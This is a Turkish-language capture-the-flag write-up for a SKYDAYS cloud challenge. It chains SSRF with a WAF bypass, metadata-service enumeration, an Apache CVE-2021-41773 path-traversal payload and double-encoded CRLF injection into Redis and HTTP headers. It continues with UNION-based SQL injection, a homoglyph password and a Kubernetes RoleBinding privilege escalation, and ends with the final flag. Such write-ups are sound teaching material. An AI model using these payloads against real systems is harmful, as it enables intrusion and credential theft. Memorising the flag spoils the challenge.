
## 1. Keşif ve Bilgi Toplama (Reconnaissance)

Uygulamaya ilk erişim sağlandığında, kullanıcıyı temel bir "Cloud Webhook Configuration" arayüzü karşılamaktadır.

* **Durum Analizi:** Uygulamanın, kullanıcı tarafından sağlanan bir URL'ye istek göndererek dönen yanıtı ekrana yansıtması, potansiyel bir SSRF (Server-Side Request Forgery) zafiyetinin varlığına işaret etmektedir.
* **Davranış Doğrulaması:**
  * Harici bir adrese (örn. `http://google.com`) yapılan isteklerin başarıyla sonuçlandığı görülmektedir.
  * Dahili IP adreslerine (örn. `http://127.0.0.1` veya `http://localhost`) yönelik talepler ise `WAF Blocked! Access to internal resources is restricted.` uyarı mesajı ile güvenlik duvarı (WAF) tarafından engellenmektedir.

### HTTP Yanıt Başlıklarının Analizi (Header Analysis)

Güvenlik analizinin temel prensiplerinden biri olan HTTP yanıt başlıklarının (headers) incelenmesi sonucunda, sunucudan dönen yanıtlarda aşağıdaki kritik bilgi ifşası (information disclosure) tespit edilmiştir:

```http
X-Cloud-Metadata-Endpoint: cloud-metadata-service:8080
```

Bu veri, iç ağda erişilebilir durumda olan ve `8080` portunda çalışan `cloud-metadata-service` isimli bir mikroservisin bulunduğunu kanıtlamaktadır.

---

## 2. IMDS Keşfi

SSRF zafiyetini kullanarak elde edilen uç noktaya (`http://cloud-metadata-service:8080`) bir istek gönderildiğinde, sunucu yanıt olarak `latest` dizinini döndürmektedir. Bu dizin yapısı, sistemde tipik bir AWS Instance Metadata Service (IMDS) ortamının simüle edildiğini göstermektedir.

Sistematik bir dizin taraması ile sunucu üzerindeki ağaç yapısı aşağıdaki şekilde haritalandırılabilir:

1. **Kök Dizin:** `http://cloud-metadata-service:8080/latest/meta-data/` altındaki erişilebilir tüm yollar listelenir.
2. **Özel Etiketler:** `http://cloud-metadata-service:8080/latest/meta-data/tags/instance`
   * **Dönen Sonuç:** `Name, Environment, VaultEndpoint, InternalServices`
3. **Vault Uç Noktası:** `http://cloud-metadata-service:8080/latest/meta-data/tags/instance/VaultEndpoint`
   * **Dönen Sonuç:** `http://cloud-internal-vault:5000/api/v1/vault/state` (Ara hedeflerden biri)
4. **İç Servisler Listesi:** `http://cloud-metadata-service:8080/latest/meta-data/tags/instance/InternalServices`
   * **Dönen Sonuç:** `cloud-internal-redis:6379`, `cloud-apache-server:80`, `cloud-log-store:27017`, `cloud-k8s-api:8443`, `cloud-analytics-engine:9200`, `cloud-user-db:3000`

Analiz derinleştirildiğinde, hedefe giden gerçek ilerleme yolunun `cloud-apache-server` servisi üzerinden geçtiği anlaşılmaktadır:

5. **Apache Servis Bilgisi:** `http://cloud-metadata-service:8080/latest/meta-data/services/apache`
   * **Elde Edilen Bilgi:** `Legacy web server. Version: Apache/2.4.49 (Unix). Holds Redis auth configuration in /usr/local/apache2/conf/internal/redis.conf`
6. **IAM Rol ve Kimlik Bilgileri:** `http://cloud-metadata-service:8080/latest/meta-data/iam/security-credentials/CloudVaultAccessRole`
   * **Elde Edilen Veri:** Bir `Access Key` (`AKIA-VAULT-ACCESS-XYZ`) ve Secret Key lokasyonuna dair net bir yönlendirme: *"SecretAccessKey is stored in the internal Redis cache (cloud-internal-redis:6379)"*

---

## 3. Apache CVE-2021-41773 Zafiyetinin İstismarı

IMDS keşif evresinde elde edilen sürüm bilgisi (Apache 2.4.49), ilgili sunucunun kritik bir Dizin Atlatma (Path Traversal) zafiyeti olan **CVE-2021-41773**'ten etkilendiğini göstermektedir. Redis kimlik doğrulaması için gerekli olan veriyi okumak amacıyla, Webhook arayüzü üzerinden aşağıdaki payload gönderilir:

```http
http://cloud-apache-server:80/cgi-bin/.%2e/.%2e/.%2e/.%2e/usr/local/apache2/conf/internal/redis.conf
```

İsteğin başarıyla sonuçlanmasının ardından ekranda `requirepass R3d1sP@ssw0rd!` metni belirir. Böylelikle Redis sunucusuna erişim sağlamak için gereken parola elde edilmiş olur.

---

## 4. Redis Protokol Enjeksiyonu ve CRLF Bypass

Sıradaki hedef, `cloud-internal-redis:6379` adresi üzerinden `vault_secret_key` değerini okumaktır. SSRF zafiyeti kullanılarak HTTP üzerinden ham (raw) soket bağlantısı bekleyen Redis servisine, CRLF (Carriage Return Line Feed) karakterleri yardımıyla doğrudan komut enjekte edilebilir.

Ancak standart URL kodlamaları (örneğin `%0d%0a`), uygulamadaki güvenlik filtresine (WAF) takılarak `"WAF Blocked! Illegal characters detected in URL."` hatasına neden olmaktadır.

### Filtreyi Atlatma (Double URL Encoding)

Güvenlik mekanizmasını atlatmak için ilgili karakterler çift URL kodlama (double url-encoding) işleminden geçirilmelidir:
* Boşluk (`%20`) -> `%2520`
* CR (`%0d`) -> `%250d`
* LF (`%0a`) -> `%250a`

### Payload Oluşturma

Redis sunucusunda sırasıyla `AUTH`, `GET` ve bağlantıyı güvenlice sonlandırmak için `QUIT` komutlarını çalıştıracak veri bloğu aşağıdaki gibi yapılandırılır:

```http
http://cloud-internal-redis:6379/%2520%250d%250aAUTH%2520R3d1sP@ssw0rd!%250d%250aGET%2520vault_secret_key%250d%250aQUIT%250d%250a
```

Uygulamanın bu girdiyi işleyip kodlamayı çözmesi sonucunda CRLF enjeksiyonu gerçekleşir ve Redis servisi beklenen `Secret Key` değerini döndürür: `sunshine_is_not_enough_123`

---

## 5. Başlık Enjeksiyonu ile Vault Erişimi (CRLF Header Injection)

Önceki adımlarda Vault servisine erişim sağlamak için gereken kimlik bilgileri başarıyla toplanmıştır:
* **Access Key:** `AKIA-VAULT-ACCESS-XYZ` (IMDS aracılığıyla)
* **Secret Key:** `sunshine_is_not_enough_123` (Redis aracılığıyla)

Nihai ara hedef olan `http://cloud-internal-vault:5000/api/v1/vault/state` uç noktası, kimlik doğrulama işlemi için bu değerlerin HTTP istek başlıklarında (`X-Vault-Access-Key` ve `X-Vault-Secret-Key`) iletilmesini zorunlu kılmaktadır. HTTP isteklerine özel başlık (header) ekleyebilmek için, bir önceki adımda kullanılan CRLF (Double URL Encoded) tekniği bu aşamada HTTP protokol standartlarına uyarlanır:

Oluşturulan nihai payload:
```http
http://cloud-internal-vault:5000/api/v1/vault/state%2520HTTP/1.1%250d%250aHost:%2520cloud-internal-vault:5000%250d%250aX-Vault-Access-Key:%2520AKIA-VAULT-ACCESS-XYZ%250d%250aX-Vault-Secret-Key:%2520sunshine_is_not_enough_123%250d%250a%250d%250a
```

---

## 6. Kriptografik Analiz ve State Dosyasının Çözülmesi

Başarılı Vault isteği sonrasında sistem, Terraform State dosyasının şifrelenmiş halini içeren bir JSON nesnesi döndürmektedir. Dönen veride yer alan şifreleme parametreleri şunlardır:
* **Algoritma:** AES-256-CBC
* **Başlangıç Vektörü (IV):** `iv_hex`
* **Anahtar (Key):** `key_hex`
* **Şifreli Metin:** `ciphertext_base64`

Elde edilen veriler doğrultusunda şifrelenmiş metni çözmek için aşağıdaki Python betiği (script) kullanılabilir:

```python
import base64
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

key = bytes.fromhex("73756e7368696e655f6b65795f333262797465735f65786163746c795f212121")
iv = bytes.fromhex("696e69745f766563746f725f31366221")
ciphertext = base64.b64decode("...") # Vault'tan dönen base64 veriyi buraya ekleyin

cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = unpad(cipher.decrypt(ciphertext), AES.block_size).decode('utf-8')

with open('state.json', 'w') as f:
    f.write(plaintext)
```

İşlem sonucunda elde edilen `state.json` dosyası analiz edildiğinde, `primary_db` isimli kaynağın etiketleri (`tags`) arasında bulunan `CostCenterBackup` anahtarı dikkat çeker. İlgili anahtarın değeri Base64 formatında kodlanmış olup, çözüldüğünde şu veriyi döndürür:

`cloud-user-db:3000 /api/v1/search - X-Admin-Key: admin123`

---

## 7. Veritabanı Analizi ve SQL Enjeksiyonu (SQL Injection)

Verilen bilgiler ile `cloud-user-db` içindeki `/api/v1/search` uç noktasına gidildiğinde, sistemdeki SQLite veritabanının arama parametrelerinde bir zafiyet barındırdığı görülmektedir. Ancak doğrudan bu adrese gidildiğinde sistem "Missing or invalid X-Admin-Key" hatası (HTTP 401) verecektir. Bu doğrulamayı aşmak için, daha önce elde edilen `X-Admin-Key: admin123` değerinin HTTP isteğine eklenmesi gerekmektedir. `cloud-webhook-invoker` üzerindeki CRLF zafiyeti (HTTP Header Injection) kullanılarak, özel HTTP başlığı enjekte edilir ve SSRF üzerinden UNION tabanlı (UNION-based) SQL enjeksiyonu gerçekleştirilerek veritabanı haritalandırılır:

1. **Tablo İsimlerinin Çekilmesi:**
   ```http
   http://cloud-user-db:3000/api/v1/search?username='%20UNION%20SELECT%201,%20name,%203,%204,%205%20FROM%20sqlite_master%20WHERE%20type='table'--%2520HTTP/1.1%250d%250aX-Admin-Key:%2520admin123%250d%250aIgnore-Protocol:
   ```
   *Not: SQL sorgusundaki boşlukların HTTP istek satırını bozmaması (HTTP 400 Bad Request hatası vermemesi) için `%20` ile kodlanması gerekirken, HTTP protokol satırı (`HTTP/1.1`) ve başlık değerindeki (`X-Admin-Key: admin123`) boşluklar CRLF enjeksiyonunun düzgün çalışması adına `%2520` (çift kodlama) ile gönderilmelidir.*

   Bu işlem sonucunda sistemdeki `users`, `system_config` ve `secret_projects` tabloları keşfedilir. `secret_projects` içerisinde yer alan ve devasa bir **Deep Archive** (Project Nebula) olan veri kümesi, derin şifrelemeler içerir; ancak herhangi bir bayrak barındırmayan bir şaşırtmaca (rabbit hole) işlevi görmektedir.

2. **`system_config` Tablosundan Şifre Okuması:**
   ```http
   http://cloud-user-db:3000/api/v1/search?username='%20UNION%20SELECT%201,%20key_name,%20key_value,%20description,%205%20FROM%20system_config--%2520HTTP/1.1%250d%250aX-Admin-Key:%2520admin123%250d%250aIgnore-Protocol:
   ```
   Bu okuma sonucunda `identity_portal_pass` anahtarına karşılık gelen değerin `cloud access` olduğu tespit edilir.

---

## 8. Cloud Identity Portal ve Homoglyph Saldırısı (Kiril Alfabesi)

Ağdaki `cloud-identity-portal:8000` servisine (dışarıdan `iam.justcloud.skydays.ctf` adresi ile) ulaşıldığında kullanıcıyı bir giriş ekranı karşılamaktadır. Parola bölümüne elde edilen "cloud access" metni girildiğinde sistem erişimi reddetmektedir.

Sayfada yer alan "Forgot Token?" ipucu butonu incelendiğinde, DOM içerisine gizlenmiş `bасkԁооr` (Kiril alfabesindeki harflerden ve görünmez boşluk karakterlerinden oluşan bir metin) mesajı bulunur. Buradan, şifrenin sıradan Latin alfabesi ile değil, **homoglyph saldırı mantığına** uygun olarak ilgili Kiril varyasyonlarıyla yazılması gerektiği anlaşılmaktadır.

Doğru şifre formasyonu şu şekildedir: `сlоuԁ​ассеѕѕ` (Görünmez boşluk `\u200B` ve Kiril varyasyonları ile birlikte).

Bu metnin sunucuya doğru formda iletilmesiyle birlikte, sistem bir `kubeconfig.yaml` dosyası indirmeye sunmaktadır.

---

## 9. Kubernetes RBAC Zafiyeti ve Ayrıcalık Yükseltme (Privilege Escalation)

İndirilen `kubeconfig.yaml` dosyası incelendiğinde, kullanıcının `guest-sa` adında bir Service Account (SA) olduğu ve hedefin `https://cloud-k8s-api:8443` uç noktasında çalışan bir Kubernetes kümesi olduğu görülmektedir. Dosya içerisinde bulunan `dummy-bearer-token-12345` token değeri üzerinden küme ile etkileşime geçmek mümkündür.

Bağlantının kurulması ve sistem üzerindeki mevcut yetkilerin listelenmesi için aşağıdaki komut çalıştırılır:

```bash
kubectl --kubeconfig kubeconfig.yaml auth can-i --list
```

Bu komutun çıktısı incelendiğinde, kullanıcının `secrets` veya `pods` gibi kaynakları okuma/listeleme yetkisinin olmadığı (`NO` döndüğü) açıkça görülmektedir. Ancak, çıktıdaki istisnai bir kural dikkati çeker: Kullanıcıya, `default` namespace içerisinde `rolebindings` kaynağı için `create` fiili (verb) yetkisi verilmiştir.

Bu yetki, kullanıcının `default` namespace altında yeni bir RoleBinding objesi oluşturarak yetki ataması yapabileceği anlamına gelir. Hedeflenen `secrets` verilerine ulaşmak için `kubectl --kubeconfig kubeconfig.yaml get secrets -n nebula-system` komutu denendiğinde sistemin yetki hatası (403 Forbidden) verdiği görülür:
`User "guest-sa" cannot list resource "secrets" in API group "" in the namespace "nebula-system"`.

Bu yetki kısıtlamasını aşmak (RBAC Privilege Escalation) için, yüksek ayrıcalıklara sahip `nebula-admin-role` rolü ile `guest-sa` hesabını ilişkilendirecek bir `exploit.yaml` dosyası oluşturulur:

```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: exploit-binding
  namespace: default
roleRef:
  apiGroup: rbac.authorization.k8s.io
  kind: Role
  name: nebula-admin-role
subjects:
- kind: ServiceAccount
  name: guest-sa
  namespace: default
```

Hazırlanan manifest dosyası Kubernetes API'sine uygulanır:

```bash
kubectl --kubeconfig kubeconfig.yaml apply -f exploit.yaml
```

Çıktıda RoleBinding'in başarıyla oluşturulduğu (`rolebinding.rbac.authorization.k8s.io/exploit-binding-... created`) görülür. Ancak sistem, standart bir Kubernetes ortamından farklı olarak yetkileri anında yansıtmaz. Bunun yerine arka planda oluşturulan kaynağa gizli bir ipucu bırakır. 

Bu ipucunu ve geçici yetkiyi bulmak için oluşturulan RoleBinding'lerin detayları YAML formatında incelenir:

```bash
kubectl --kubeconfig kubeconfig.yaml get rolebindings -o yaml
```

Çıktıdaki `metadata.annotations` kısmında, `skydays/hint` başlığı altında tek kullanımlık bir geçici admin token'ı (örneğin: `admin-tmp-token-xyz...`) verildiği tespit edilir. 

Artık bu geçici token kullanılarak, normalde engellenmiş olan `secrets` kaynağına JSON formatında erişim sağlanabilir. *(Not: Hedef sistem mimarisi gereği tekil bir sırra istek atıldığında 404 döndürdüğü için tüm secrets listesi çekilir)*:

```bash
kubectl --kubeconfig kubeconfig.yaml --token="<BULUNAN_TOKEN_BURAYA_YAZILACAK>" get secrets -n nebula-system -o json
```

Elde edilen JSON verisindeki `terraform.tfstate` anahtarının değeri Base64 ile kodlanmıştır. Bu değer çözüldüğünde, sistemin altyapısını tanımlayan gerçek bir Terraform State dosyası ile karşılaşılır. Dosya içerisindeki `outputs` bloğu incelendiğinde final bayrağı elde edilir:

```json
"outputs": {
  "flag": {
    "value": "SKYDAYS{th3r35_n0_cl0ud_1ts_jU5t_50m30n3_eL5e5_c0mPUt3R_8a9b}",
    "type": "string"
  }
}
```

**Nihai Bayrak:** `SKYDAYS{th3r35_n0_cl0ud_1ts_jU5t_50m30n3_eL5e5_c0mPUt3R_8a9b}`
```

